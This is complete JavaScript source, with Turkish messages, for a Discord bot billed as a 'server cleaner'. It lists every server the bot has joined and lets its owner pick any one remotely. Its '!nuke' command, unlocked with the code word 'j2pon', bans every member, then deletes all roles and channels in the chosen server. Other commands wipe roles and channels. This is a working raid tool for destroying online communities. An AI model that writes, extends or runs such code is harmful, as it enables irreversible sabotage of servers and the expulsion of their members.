const { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType, EmbedBuilder, GuildBan } = require('discord.js');
const config = require('./config');


const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildBans
    ]
});


const cooldowns = new Map();


client.once('ready', () => {
    console.log(`✅ Bot ${client.user.tag} olarak giriş yaptı!`);
    console.log(`🎯 Komutlar sadece sunucu ID: ${config.targetServerId} da çalışır`);
    console.log(`📋 Prefix: ${config.prefix}`);
});


client.on('messageCreate', async (message) => {
  
    if (message.guild?.id !== config.targetServerId) return;
    
    
    if (message.author.bot) return;
    

    if (message.author.id !== config.ownerId) {
        return message.reply('❌ Bu botu sadece bot sahibi kullanabilir!');
    }
    
   
    if (!message.content.startsWith(config.prefix)) return;
    
    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    
    
    const cooldownKey = `${message.author.id}-${command}`;
    const cooldown = cooldowns.get(cooldownKey);
    const now = Date.now();
    
    if (cooldown && now < cooldown) {
        const timeLeft = (cooldown - now) / 1000;
        return message.reply(`⏰ Bu komutu tekrar kullanmak için ${timeLeft.toFixed(1)} saniye bekleyin!`);
    }
    
    
    cooldowns.set(cooldownKey, now + config.cooldown);
    
    try {
        switch (command) {
            case 'help':
                await showHelp(message);
                break;
            case 'servers':
                await listServers(message);
                break;
            case 'nuke':
                await nukeServer(message, args);
                break;
            case 'clean':
                await cleanServer(message, args);
                break;
            case 'cleanroles':
                await cleanRoles(message, args);
                break;
            case 'cleanchannels':
                await cleanChannels(message, args);
                break;
            case 'status':
                await showStatus(message, args);
                break;
            default:
                await message.reply('❌ Bilinmeyen komut! `!help` yazarak mevcut komutları görebilirsiniz.');
        }
    } catch (error) {
        console.error('Komut hatası:', error);
        await message.reply('❌ Komut çalıştırılırken bir hata oluştu!');
    }
});


async function showHelp(message) {
    const embed = new EmbedBuilder()
        .setTitle('🤖 Discord Server Cleaner Bot')
        .setDescription('Sunucu temizleme komutları (sadece bu sunucuda çalışır)')
        .setColor(0x00ff00)
        .addFields(
            {
                name: '📋 Komutlar',
                value: `\`${config.prefix}help\` - Bu yardım menüsünü gösterir\n` +
                       `\`${config.prefix}servers\` - Botun bulunduğu sunucuları listeler\n` +
                       `\`${config.prefix}nuke\` - Sunucu seçerek NÜKLEER SALDIRI yapar\n` +
                       `\`${config.prefix}clean\` - Sunucu seçerek temizlik yapar\n` +
                       `\`${config.prefix}cleanroles\` - Sunucu seçerek rolleri temizler\n` +
                       `\`${config.prefix}cleanchannels\` - Sunucu seçerek odaları temizler\n` +
                       `\`${config.prefix}status\` - Sunucu seçerek durumu gösterir`,
                inline: false
            },
            {
                name: '⚠️ Uyarı',
                value: 'Bu komutlar geri alınamaz! Kullanmadan önce emin olun.',
                inline: false
            }
        )
        .setTimestamp();
    
    await message.reply({ embeds: [embed] });
}


async function listServers(message) {
    try {
        const guilds = client.guilds.cache;
        
        if (guilds.size === 0) {
            return message.reply('❌ Bot hiçbir sunucuda bulunmuyor!');
        }
        
        const embed = new EmbedBuilder()
            .setTitle('🏠 Botun Bulunduğu Sunucular')
            .setDescription('Aşağıdaki sunuculardan birini seçmek için numarasını yazın:')
            .setColor(0x0099ff)
            .setTimestamp();
        
        let serverList = '';
        let serverData = [];
        
        let index = 1;
        for (const [guildId, guild] of guilds) {
            try {
                await guild.fetch();
                const memberCount = guild.memberCount || 'Bilinmiyor';
                const owner = guild.ownerId ? `<@${guild.ownerId}>` : 'Bilinmiyor';
                
                serverList += `**${index}.** ${guild.name}\n`;
                serverList += `   🆔 ID: \`${guild.id}\`\n`;
                serverList += `   👥 Üyeler: ${memberCount}\n`;
                serverList += `   👑 Sahip: ${owner}\n\n`;
                
                serverData.push({
                    id: guild.id,
                    name: guild.name,
                    memberCount: memberCount,
                    ownerId: guild.ownerId
                });
                
                index++;
            } catch (error) {
                serverList += `**${index}.** ${guild.name} (Bilgi alınamadı)\n`;
                serverList += `   🆔 ID: \`${guild.id}\`\n\n`;
                
                serverData.push({
                    id: guild.id,
                    name: guild.name,
                    memberCount: 'Bilinmiyor',
                    ownerId: null
                });
                
                index++;
            }
        }
        
        embed.addFields({
            name: '📋 Sunucu Listesi',
            value: serverList || 'Sunucu bulunamadı',
            inline: false
        });
        
        embed.addFields({
            name: '💡 Kullanım',
            value: 'Sunucu numarasını yazarak seçim yapın (örn: `1`, `2`, `3`)\n\n**Örnek:** `!nuke` yazıp sunucu numarasını seçin',
            inline: false
        });
        
        const serverMessage = await message.reply({ embeds: [embed] });
        
       
        const filter = (response) => response.author.id === message.author.id;
        const collector = message.channel.createMessageCollector({ filter, time: 60000, max: 1 });
        
        collector.on('collect', async (response) => {
            const choice = parseInt(response.content.trim());
            
            if (isNaN(choice) || choice < 1 || choice > serverData.length) {
                await message.reply('❌ Geçersiz seçim! Lütfen listeden bir numara seçin.');
                return;
            }
            
            const selectedServer = serverData[choice - 1];
            
            const confirmEmbed = new EmbedBuilder()
                .setTitle('✅ Sunucu Seçildi')
                .setDescription(`**${selectedServer.name}** sunucusu seçildi!`)
                .setColor(0x00ff00)
                .addFields(
                    { name: '🆔 Sunucu ID', value: selectedServer.id, inline: true },
                    { name: '👥 Üye Sayısı', value: selectedServer.memberCount.toString(), inline: true },
                    { name: '👑 Sahip', value: selectedServer.ownerId ? `<@${selectedServer.ownerId}>` : 'Bilinmiyor', inline: true }
                )
                .setTimestamp();
            
            await message.reply({ embeds: [confirmEmbed] });
            
            
            global.selectedServer = selectedServer;
        });
        
        collector.on('end', async (collected) => {
            if (collected.size === 0) {
                await message.reply('⏰ Zaman aşımı! Sunucu seçimi iptal edildi.');
            }
        });
        
    } catch (error) {
        console.error('Sunucu listeleme hatası:', error);
        await message.reply('❌ Sunucu listesi alınırken hata oluştu!');
    }
}


async function showStatus(message, args) {
    let guildId;
    let guild;
    
   
    if (args[0]) {
        guildId = args[0];
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Bot bu sunucuda bulunmuyor veya sunucu bulunamadı!');
        }
    } else {
        
        if (!global.selectedServer) {
            return message.reply('❌ Önce `!servers` komutu ile bir sunucu seçin!');
        }
        
        guildId = global.selectedServer.id;
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Seçilen sunucu bulunamadı! Lütfen `!servers` ile tekrar seçin.');
        }
    }
    
    try {
        await guild.fetch();
        
        const embed = new EmbedBuilder()
            .setTitle(`📊 ${guild.name} Durumu`)
            .setColor(0x0099ff)
            .addFields(
                { name: '👥 Üye Sayısı', value: guild.memberCount.toString(), inline: true },
                { name: '📝 Rol Sayısı', value: guild.roles.cache.size.toString(), inline: true },
                { name: '📢 Kanal Sayısı', value: guild.channels.cache.size.toString(), inline: true },
                { name: '👑 Sunucu Sahibi', value: `<@${guild.ownerId}>`, inline: true },
                { name: '🆔 Sunucu ID', value: guild.id, inline: true },
                { name: '📅 Oluşturulma', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:F>`, inline: true }
            )
            .setThumbnail(guild.iconURL())
            .setTimestamp();
        
        await message.reply({ embeds: [embed] });
    } catch (error) {
        console.error('Status komutu hatası:', error);
        await message.reply('❌ Sunucu bilgileri alınırken hata oluştu!');
    }
}


async function nukeServer(message, args) {
    let guildId;
    let guild;
    
    
    if (args[0]) {
        guildId = args[0];
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Bot bu sunucuda bulunmuyor veya sunucu bulunamadı!');
        }
    } else {
        
        if (!global.selectedServer) {
            return message.reply('❌ Önce `!servers` komutu ile bir sunucu seçin!');
        }
        
        guildId = global.selectedServer.id;
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Seçilen sunucu bulunamadı! Lütfen `!servers` ile tekrar seçin.');
        }
    }
    
    try {
        await guild.fetch();
        
        
        const confirmEmbed = new EmbedBuilder()
            .setTitle('💥 NÜKLEER SALDIRI UYARISI!')
            .setDescription(`**${guild.name}** sunucusunu TAMAMEN YOK ETMEK istediğinizden emin misiniz?\n\nBu işlem:\n• TÜM rolleri silecek\n• TÜM odaları silecek\n• TÜM üyeleri banlayacak\n\nBu işlem **GERİ ALINAMAZ**!`)
            .setColor(0xff0000)
            .addFields(
                { name: '📝 Silinecek Roller', value: guild.roles.cache.size.toString(), inline: true },
                { name: '📢 Silinecek Kanallar', value: guild.channels.cache.size.toString(), inline: true },
                { name: '👥 Banlanacak Üyeler', value: guild.memberCount.toString(), inline: true }
            )
            .setTimestamp();
        
        const confirmMessage = await message.reply({ 
            embeds: [confirmEmbed],
            content: '**j2pon** yazarak onaylayın veya **HAYIR** yazarak iptal edin.'
        });
        
        const filter = (response) => response.author.id === message.author.id;
        const collector = message.channel.createMessageCollector({ filter, time: 30000, max: 1 });
        
        collector.on('collect', async (response) => {
            if (response.content.toLowerCase() === 'j2pon') {
                await message.reply('💥 NÜKLEER SALDIRI BAŞLATILIYOR...');
                await performNuke(message, guild);
            } else {
                await message.reply('❌ İşlem iptal edildi.');
            }
        });
        
        collector.on('end', async (collected) => {
            if (collected.size === 0) {
                await message.reply('⏰ Zaman aşımı! İşlem iptal edildi.');
            }
        });
        
    } catch (error) {
        console.error('Nuke komutu hatası:', error);
        await message.reply('❌ Nuke işlemi başlatılırken hata oluştu!');
    }
}


async function cleanServer(message, args) {
    let guildId;
    let guild;
    
   
    if (args[0]) {
        guildId = args[0];
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Bot bu sunucuda bulunmuyor veya sunucu bulunamadı!');
        }
    } else {
        
        if (!global.selectedServer) {
            return message.reply('❌ Önce `!servers` komutu ile bir sunucu seçin!');
        }
        
        guildId = global.selectedServer.id;
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Seçilen sunucu bulunamadı! Lütfen `!servers` ile tekrar seçin.');
        }
    }
    
    try {
        await guild.fetch();
        
        
        const confirmEmbed = new EmbedBuilder()
            .setTitle('⚠️ UYARI!')
            .setDescription(`**${guild.name}** sunucusundaki TÜM rolleri ve odaları silmek istediğinizden emin misiniz?\n\nBu işlem **GERİ ALINAMAZ**!`)
            .setColor(0xff0000)
            .addFields(
                { name: '📝 Silinecek Roller', value: guild.roles.cache.size.toString(), inline: true },
                { name: '📢 Silinecek Kanallar', value: guild.channels.cache.size.toString(), inline: true }
            )
            .setTimestamp();
        
        const confirmMessage = await message.reply({ 
            embeds: [confirmEmbed],
            content: '**EVET** yazarak onaylayın veya **HAYIR** yazarak iptal edin.'
        });
        
       
        const filter = (response) => response.author.id === message.author.id;
        const collector = message.channel.createMessageCollector({ filter, time: 30000, max: 1 });
        
        collector.on('collect', async (response) => {
            if (response.content.toLowerCase() === 'evet') {
                await message.reply('🔄 Temizleme işlemi başlatılıyor...');
                await performCleanup(message, guild, 'all');
            } else {
                await message.reply('❌ İşlem iptal edildi.');
            }
        });
        
        collector.on('end', async (collected) => {
            if (collected.size === 0) {
                await message.reply('⏰ Zaman aşımı! İşlem iptal edildi.');
            }
        });
        
    } catch (error) {
        console.error('Clean komutu hatası:', error);
        await message.reply('❌ Sunucu temizleme işlemi başlatılırken hata oluştu!');
    }
}


async function cleanRoles(message, args) {
    let guildId;
    let guild;
    
   
    if (args[0]) {
        guildId = args[0];
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Bot bu sunucuda bulunmuyor veya sunucu bulunamadı!');
        }
    } else {
        
        if (!global.selectedServer) {
            return message.reply('❌ Önce `!servers` komutu ile bir sunucu seçin!');
        }
        
        guildId = global.selectedServer.id;
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Seçilen sunucu bulunamadı! Lütfen `!servers` ile tekrar seçin.');
        }
    }
    
    try {
        await guild.fetch();
        await message.reply('🔄 Rol temizleme işlemi başlatılıyor...');
        await performCleanup(message, guild, 'roles');
    } catch (error) {
        console.error('CleanRoles komutu hatası:', error);
        await message.reply('❌ Rol temizleme işlemi başlatılırken hata oluştu!');
    }
}


async function cleanChannels(message, args) {
    let guildId;
    let guild;
    
    if (args[0]) {
        guildId = args[0];
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Bot bu sunucuda bulunmuyor veya sunucu bulunamadı!');
        }
    } else {
       
        if (!global.selectedServer) {
            return message.reply('❌ Önce `!servers` komutu ile bir sunucu seçin!');
        }
        
        guildId = global.selectedServer.id;
        guild = client.guilds.cache.get(guildId);
        
        if (!guild) {
            return message.reply('❌ Seçilen sunucu bulunamadı! Lütfen `!servers` ile tekrar seçin.');
        }
    }
    
    try {
        await guild.fetch();
        await message.reply('🔄 Kanal temizleme işlemi başlatılıyor...');
        await performCleanup(message, guild, 'channels');
    } catch (error) {
        console.error('CleanChannels komutu hatası:', error);
        await message.reply('❌ Kanal temizleme işlemi başlatılırken hata oluştu!');
    }
}

async function performNuke(message, guild) {
    const startTime = Date.now();
    let deletedRoles = 0;
    let deletedChannels = 0;
    let bannedMembers = 0;
    let errors = [];
    
    try {
       
        await message.reply('💥 1/3 - Üyeler banlanıyor...');
        try {
            const members = await guild.members.fetch();
            for (const [memberId, member] of members) {
                try {
                    if (member.id !== client.user.id && member.id !== guild.ownerId) {
                        await member.ban({ reason: `Nuke işlemi - ${message.author.tag}` });
                        bannedMembers++;
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                } catch (error) {
                    errors.push(`Üye banlanamadı: ${member.user.tag} - ${error.message}`);
                }
            }
        } catch (error) {
            errors.push(`Üye listesi alınamadı: ${error.message}`);
        }
        
       
        await message.reply('💥 2/3 - Roller siliniyor...');
        try {
            const roles = guild.roles.cache.filter(role => 
                role.id !== guild.id && 
                role.editable 
            );
            
            for (const [roleId, role] of roles) {
                try {
                    await role.delete(`Nuke işlemi - ${message.author.tag}`);
                    deletedRoles++;
                    await new Promise(resolve => setTimeout(resolve, 1000)); 
                } catch (error) {
                    errors.push(`Rol silinemedi: ${role.name} - ${error.message}`);
                }
            }
        } catch (error) {
            errors.push(`Rol listesi alınamadı: ${error.message}`);
        }
        
        
        await message.reply('💥 3/3 - Kanallar siliniyor...');
        try {
            const channels = guild.channels.cache.filter(channel => 
                channel.deletable 
            );
            
            for (const [channelId, channel] of channels) {
                try {
                    await channel.delete(`Nuke işlemi - ${message.author.tag}`);
                    deletedChannels++;
                    await new Promise(resolve => setTimeout(resolve, 1000)); 
                } catch (error) {
                    errors.push(`Kanal silinemedi: ${channel.name} - ${error.message}`);
                }
            }
        } catch (error) {
            errors.push(`Kanal listesi alınamadı: ${error.message}`);
        }
        
        const endTime = Date.now();
        const duration = ((endTime - startTime) / 1000).toFixed(2);
        
        const embed = new EmbedBuilder()
            .setTitle('💥 NÜKLEER SALDIRI TAMAMLANDI!')
            .setColor(0xff0000)
            .addFields(
                { name: '👥 Banlanan Üyeler', value: bannedMembers.toString(), inline: true },
                { name: '📝 Silinen Roller', value: deletedRoles.toString(), inline: true },
                { name: '📢 Silinen Kanallar', value: deletedChannels.toString(), inline: true },
                { name: '⏱️ Süre', value: `${duration} saniye`, inline: true }
            )
            .setTimestamp();
        
        if (errors.length > 0) {
            embed.addFields({
                name: '⚠️ Hatalar',
                value: errors.slice(0, 10).join('\n') + (errors.length > 10 ? `\n... ve ${errors.length - 10} hata daha` : ''),
                inline: false
            });
        }
        
        await message.reply({ embeds: [embed] });
        
    } catch (error) {
        console.error('Nuke hatası:', error);
        await message.reply('❌ Nuke işlemi sırasında kritik hata oluştu!');
    }
}


async function performCleanup(message, guild, type) {
    const startTime = Date.now();
    let deletedRoles = 0;
    let deletedChannels = 0;
    let errors = [];
    
    try {
        
        if (type === 'all' || type === 'roles') {
            try {
                const roles = guild.roles.cache.filter(role => 
                    role.id !== guild.id && 
                    role.editable 
                );
                
                for (const [roleId, role] of roles) {
                    try {
                        await role.delete(`Temizleme işlemi - ${message.author.tag}`);
                        deletedRoles++;
                        await new Promise(resolve => setTimeout(resolve, 1000)); 
                    } catch (error) {
                        errors.push(`Rol silinemedi: ${role.name} - ${error.message}`);
                      
                        continue;
                    }
                }
            } catch (error) {
                errors.push(`Rol listesi alınamadı: ${error.message}`);
            }
        }
        
        
        if (type === 'all' || type === 'channels') {
            try {
                const channels = guild.channels.cache.filter(channel => 
                    channel.deletable 
                );
                
                for (const [channelId, channel] of channels) {
                    try {
                        await channel.delete(`Temizleme işlemi - ${message.author.tag}`);
                        deletedChannels++;
                        await new Promise(resolve => setTimeout(resolve, 1000)); 
                    } catch (error) {
                        errors.push(`Kanal silinemedi: ${channel.name} - ${error.message}`);
                       
                        continue;
                    }
                }
            } catch (error) {
                errors.push(`Kanal listesi alınamadı: ${error.message}`);
            }
        }
        
        const endTime = Date.now();
        const duration = ((endTime - startTime) / 1000).toFixed(2);
        
        const embed = new EmbedBuilder()
            .setTitle('✅ Temizleme Tamamlandı!')
            .setColor(0x00ff00)
            .addFields(
                { name: '📝 Silinen Roller', value: deletedRoles.toString(), inline: true },
                { name: '📢 Silinen Kanallar', value: deletedChannels.toString(), inline: true },
                { name: '⏱️ Süre', value: `${duration} saniye`, inline: true }
            )
            .setTimestamp();
        
        if (errors.length > 0) {
            embed.addFields({
                name: '⚠️ Hatalar (Atlandı)',
                value: errors.slice(0, 10).join('\n') + (errors.length > 10 ? `\n... ve ${errors.length - 10} hata daha` : ''),
                inline: false
            });
        }
        
        await message.reply({ embeds: [embed] });
        
    } catch (error) {
        console.error('Temizleme hatası:', error);
       
        await message.reply('⚠️ Temizleme işlemi sırasında bazı hatalar oluştu ama devam edildi!');
    }
}


client.on('error', (error) => {
    console.error('Discord Client Hatası:', error);
    
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    
});


client.on('disconnect', () => {
    console.log('Bot bağlantısı kesildi, yeniden bağlanılıyor...');
});

client.on('reconnecting', () => {
    console.log('Bot yeniden bağlanıyor...');
});

client.on('resume', () => {
    console.log('Bot bağlantısı yeniden kuruldu!');
});


client.login(config.token);
